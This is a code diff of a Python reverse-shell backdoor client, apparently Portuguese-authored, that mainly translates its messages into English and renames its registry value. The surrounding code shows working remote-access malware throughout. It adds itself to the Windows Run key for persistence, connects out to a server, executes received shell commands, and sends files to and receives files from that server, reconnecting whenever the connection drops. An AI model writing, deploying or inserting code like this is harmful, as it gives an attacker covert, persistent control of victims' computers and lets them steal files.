@@ -14,7 +14,7 @@ def add_to_registry():
     script_path = sys.argv[0]  # Pega o caminho completo do script ou executável
     try:
         reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_WRITE)
-        reg.SetValueEx(reg_key, "windows", 0, reg.REG_SZ, script_path)  # "ClientApp" é o nome da chave no Registro
+        reg.SetValueEx(reg_key, "ClientApp", 0, reg.REG_SZ, script_path)  # "ClientApp" é o nome da chave no Registro
         reg.CloseKey(reg_key)
         print("[+] Programa adicionado ao Registro para iniciar com o Windows.")
     except Exception as e:
@@ -30,10 +30,10 @@ def connect_to_server():
 
     while True:
         try:
-            print("[+] Conectando ao Servidor...")
+            print("[+] Connecting to the server...")
             client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             client.connect((SERVER_IP, SERVER_PORT))
-            print("[+] Servidor Conectado.")
+            print("[+] Connected to the server.")
 
             # Loop de comunicação com o servidor
             while True:
@@ -41,14 +41,14 @@ def connect_to_server():
                     # Recebe o comando do servidor
                     command = client.recv(4096).decode("utf-8").strip()
                     if not command:
-                        print("[-] Nenhum comando recebido. Fechando conexão.")
+                        print("[-] No command received. Closing connection.")
                         break
 
-                    print(f"[+] Comando Recebido: {command}")
+                    print(f"[+] Command received: {command}")
 
                     # Encerra a conexão se o comando for 'exit'
                     if command.lower() == "exit":
-                        print("[+] Comando de saída recebido. Fechando conexão.")
+                        print("[+] Exit command received. Closing connection.")
                         break
 
                     # Comando 'cd' para navegar entre pastas
@@ -57,16 +57,16 @@ def connect_to_server():
                         try:
                             os.chdir(new_dir)
                             current_dir = os.getcwd()
-                            client.send(f"Diretório alterado para {current_dir}".encode("utf-8"))
+                            client.send(f"Changed directory to {current_dir}".encode("utf-8"))
                         except FileNotFoundError:
-                            client.send(f"Erro: Diretório não encontrado: {new_dir}".encode("utf-8"))
+                            client.send(f"Error: Directory not found: {new_dir}".encode("utf-8"))
                         continue
 
                     # Comando 'cd' sem argumentos (volta para o diretório inicial)
                     if command.strip() == "cd":
                         os.chdir(home_dir)  # Volta para o diretório do usuário
                         current_dir = os.getcwd()
-                        client.send(f"Diretório alterado para {current_dir}".encode("utf-8"))
+                        client.send(f"Changed directory to {current_dir}".encode("utf-8"))
                         continue
 
                     # Processa comando de download (enviar arquivo para o servidor)
@@ -78,7 +78,7 @@ def connect_to_server():
                                     client.send(chunk)
                                 client.send(b"EOF")  # Indica o fim do arquivo
                         else:
-                            client.send(b"Erro: Arquivo não encontrado")
+                            client.send(b"Error: File not foundEOF")
                         continue
 
                     # Processa comando de upload (receber arquivo do servidor)
@@ -95,7 +95,7 @@ def connect_to_server():
                         continue
 
                     # Executa comando do shell
-                    print(f"[+] Executando comando: {command}")
+                    print(f"[+] Executing command: {command}")
                     result = subprocess.run(command, shell=True, capture_output=True, text=True, cwd=current_dir)
                     output = result.stdout + result.stderr
                     if not output.strip():
@@ -108,12 +108,12 @@ def connect_to_server():
                     break
 
         except (ConnectionResetError, socket.error) as e:
-            print(f"[-] Erro de conexão: {e}")
-            print("[+] Tentando reconectar em 5 segundos...")
+            print(f"[-] Connection error: {e}")
+            print("[+] Trying to reconnect in 5 seconds...")
             time.sleep(5)  # Espera 5 segundos antes de tentar reconectar
         except Exception as e:
-            print(f"[-] Erro Inesperado: {e}")
-            print("[+] Tentando reconectar em 5 segundos...")
+            print(f"[-] Unexpected error: {e}")
+            print("[+] Trying to reconnect in 5 seconds...")
             time.sleep(5)  # Espera 5 segundos antes de tentar reconectar
 
 # Adiciona o programa ao Registro para iniciar com o Windows
